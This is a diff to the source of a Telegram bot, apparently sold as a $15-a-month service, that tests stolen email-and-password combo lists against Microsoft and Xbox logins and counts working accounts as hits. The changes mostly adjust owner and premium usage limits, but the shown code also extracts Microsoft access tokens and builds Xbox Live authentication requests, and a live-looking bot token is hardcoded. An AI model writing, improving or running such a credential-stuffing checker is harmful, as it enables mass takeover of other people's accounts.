@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Optimized Hit Logic)
+r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Fixed Owner Limit)
 """
 
 import os
@@ -15,7 +15,7 @@ import telebot
 from telebot import types
 
 TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
-OWNER_ID = 6266959915       # ايدي حسابك
+OWNER_ID = 6266959915       # ايدي حسابك المعتمد
 OWNER_USERNAME = "r1ivk"     # يوزر الأونر
 CHANNEL_USERNAME = "@r1iv_k"  
 bot = telebot.TeleBot(TOKEN)
@@ -53,8 +53,11 @@ def save_premium_users(users_set):
             f.write(f"{uid}\n")
 
 def is_owner(user_id, username=None):
-    if int(user_id) == int(OWNER_ID):
-        return True
+    try:
+        if int(user_id) == int(OWNER_ID):
+            return True
+    except:
+        pass
     if username and username.lower() == OWNER_USERNAME.lower():
         return True
     return False
@@ -89,8 +92,10 @@ def update_user_stats(user_id, checked_count, hits_count, username=None):
     save_json_data(STATS_FILE, stats)
 
 def check_daily_limit(chat_id, new_lines_count, username=None):
-    if is_owner(chat_id, username) or str(chat_id) in load_premium_users():
+    # استثناء تام وفوري للأونر والأيدي الخاص بك والمميزين
+    if is_owner(chat_id, username) or str(chat_id) in load_premium_users() or int(chat_id) == int(OWNER_ID):
         return True, new_lines_count
+        
     today = str(date.today())
     if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
         user_usage[chat_id] = {"date": today, "count": 0}
@@ -101,7 +106,7 @@ def check_daily_limit(chat_id, new_lines_count, username=None):
     return True, allowed_lines
 
 def update_usage(chat_id, count, username=None):
-    if is_owner(chat_id, username) or str(chat_id) in load_premium_users():
+    if is_owner(chat_id, username) or str(chat_id) in load_premium_users() or int(chat_id) == int(OWNER_ID):
         return
     today = str(date.today())
     if chat_id in user_usage and user_usage[chat_id]["date"] == today:
@@ -200,7 +205,6 @@ async def elite_check_account(combo):
             if "locked" in txt or "suspended" in txt:
                 return "bad", "Locked"
 
-            # استخراج الـ Access Token بدقة فائقة من الـ URL النهائي أو الـ History
             ms_token = None
             
             def search_token_in_string(s):
@@ -234,7 +238,6 @@ async def elite_check_account(combo):
             if not ms_token:
                 return "bad", "No Token"
 
-            # خطوة التوثيق الخاصة بـ Xbox Live
             xb_payload = {
                 "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                 "RelyingParty": "http://auth.xboxlive.com", 
@@ -331,7 +334,7 @@ def add_premium_cmd(message):
         prem_users = load_premium_users()
         prem_users.add(target_id)
         save_premium_users(prem_users)
-        bot.reply_to(message, f"✅ User `{target_id}` added to Premium (1 Month) successfully!", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ User `{target_id}` added to Premium successfully!", parse_mode="Markdown")
     except Exception:
         bot.reply_to(message, "⚠️ Use format: `/addprem USER_ID`", parse_mode="Markdown")
 
@@ -376,16 +379,16 @@ def show_main_menu(message):
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
     markup.add(btn_start, btn_top, btn_premium, btn_account)
 
-    today = str(date.today())
-    if is_owner(user_id, username) or str(user_id) in load_premium_users():
-        status_text = "👑 Premium / Owner (Unlimited)"
+    if is_owner(user_id, username) or str(user_id) in load_premium_users() or int(user_id) == int(OWNER_ID):
+        status_text = "👑 Owner / Premium (Unlimited)"
     else:
+        today = str(date.today())
         used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
         status_text = f"👤 Free ({used}/5000 lines today)"
 
     text = (
-        "⚡ **r1livk Elite Xbox Core Engine - V5.1** ⚡\n\n"
-        "Engine upgraded with advanced pipeline endpoints & improved hit parsing.\n"
+        "⚡ **r1livk Elite Xbox Core Engine - V5.2** ⚡\n\n"
+        "Engine upgraded & Owner limit bypass fixed.\n"
         f"Your Status: {status_text}\n\n"
         "Select an option:"
     )
@@ -459,10 +462,10 @@ def callback_query(call):
         bot.answer_callback_query(call.id, "💎 Premium Plan ($15/Month - Unlimited Lines)\nContact Owner: @r1ivk", show_alert=True)
 
     elif call.data == "my_account":
-        today = str(date.today())
-        if is_owner(user_id, username) or str(user_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Premium / Owner (Unlimited)\nMode: Elite Pipeline", show_alert=True)
+        if is_owner(user_id, username) or str(user_id) in load_premium_users() or int(user_id) == int(OWNER_ID):
+            bot.answer_callback_query(call.id, "Status: Owner / Premium (Unlimited)\nMode: Elite Pipeline", show_alert=True)
         else:
+            today = str(date.today())
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
             bot.answer_callback_query(call.id, f"Status: Free ({used}/5000 lines)\nMode: Elite Pipeline", show_alert=True)
 
